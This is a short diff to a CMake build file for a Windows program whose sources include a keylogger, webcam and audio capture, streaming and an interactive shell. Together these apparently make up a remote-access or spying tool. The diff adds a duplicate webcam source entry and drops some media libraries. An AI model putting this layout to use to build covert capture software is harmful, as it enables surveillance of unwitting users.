@@ -57,6 +57,7 @@ add_executable(main WIN32
     src/capture/Keylogger.cpp
     src/capture/Audio.cpp
     src/capture/Webcam.cpp
+    src/capture/Webcam.cpp
     src/streaming/Streamer.cpp
     src/shell/InteractiveShell.cpp
     src/fs/FileSystem.cpp
@@ -76,7 +77,7 @@ add_executable(main WIN32
 target_include_directories(main PUBLIC external external/sqlite3)
 target_link_libraries(main 
     nlohmann_json::nlohmann_json
-    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 mscoree dbghelp wlanapi ntdll mfplat mf mfuuid evr
+    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 mscoree dbghelp wlanapi ntdll
 )
 
 # Tests
